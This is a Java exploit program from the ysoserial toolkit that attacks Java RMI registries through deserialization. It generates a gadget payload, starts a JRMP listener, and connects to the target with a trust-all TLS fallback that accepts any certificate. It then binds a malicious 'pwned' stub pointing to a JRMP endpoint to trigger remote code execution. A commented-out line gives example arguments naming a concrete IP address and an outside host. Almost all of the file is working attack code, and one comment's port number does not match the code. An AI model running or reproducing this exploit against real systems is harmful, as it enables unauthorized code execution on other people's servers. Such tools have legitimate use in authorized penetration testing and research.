package ysoserial.exploit;

import java.io.IOException;
import java.net.Socket;
import java.rmi.ConnectIOException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.RMIClientSocketFactory;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import sun.rmi.server.UnicastRef;
import ysoserial.payloads.ObjectPayload;

/*
 * Utility program for exploiting RMI registries running with required gadgets available in their ClassLoader.
 * Attempts to exploit the registry itself, then enumerates registered endpoints and their interfaces.
 *
 * TODO: automatic exploitation of endpoints, potentially with automated download and use of jars containing remote
 * interfaces. See http://www.findmaven.net/api/find/class/org.springframework.remoting.rmi.RmiInvocationHandler .
 */
@SuppressWarnings({"rawtypes", "unchecked"})
public class RMIRegistryExploit2 {
	private static class TrustAllSSL implements X509TrustManager {
		private static final X509Certificate[] ANY_CA = {};
		public X509Certificate[] getAcceptedIssuers() { return ANY_CA; }
		public void checkServerTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
		public void checkClientTrusted(final X509Certificate[] c, final String t) { /* Do nothing/accept all */ }
	}

	private static class RMISSLClientSocketFactory implements RMIClientSocketFactory {
		public Socket createSocket(String host, int port) throws IOException {
			try {
				SSLContext ctx = SSLContext.getInstance("TLS");
				ctx.init(null, new TrustManager[] {new TrustAllSSL()}, null);
				SSLSocketFactory factory = ctx.getSocketFactory();
				return factory.createSocket(host, port);
			} catch(Exception e) {
				throw new IOException(e);
			}
		}
	}

	public static void main(String[] args) throws Exception {
//        args = new String[] {"121.36.222.22","2078","JRMPClient1","test.threedr3am.xyz:44443"};
		final String host = args[0];
		final int port = Integer.parseInt(args[1]);
		final String[] command = Arrays.copyOfRange(args, 3, args.length);
        final String className = args[2];
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(className);
        final ObjectPayload payload = payloadClass.newInstance();
        final Object object = payload.getObject(command);
        // Start the remote GC listener at port 1337
        JRMPListener listener = new JRMPListener(2224, className, object);
        Thread thread = new Thread(listener);
        thread.start();

        Registry registry = LocateRegistry.getRegistry(host, port);
        try {
            registry.list();
        } catch(ConnectIOException ex) {
            registry = LocateRegistry.getRegistry(host, port, new RMIRegistryExploit2.RMISSLClientSocketFactory());
        }

		// ensure payload doesn't detonate during construction or deserialization
		exploit(registry, host, port);
	}

    public static void exploit(final Registry registry,
        String jrmpHost, int jrmpPort ) throws Exception {

        // Generate the UnicastRef Object with the endpoint to the remote GC
        UnicastRef payload = generateUnicastRef(jrmpHost, jrmpPort);

        // Generate random name
        String name = "pwned" + System.nanoTime();

        // Build an RMI Implementation from the unicastRef object
        RMIConnectionImpl_Stub remote = new RMIConnectionImpl_Stub(payload);

        try {
            // Bind the RMI implementation to the RMI
            registry.bind(name, remote);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return;

    }

    public static UnicastRef generateUnicastRef(String host, int port) {
        // Create a dummy objectId
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        // Create the TCP endpoint to the remote GC
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        // Create a "LiveRef" of the dummy object with the specified endpoint
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        // Wrap the LiveRef in the UnicastRef
        return new sun.rmi.server.UnicastRef(liveRef);
    }
}
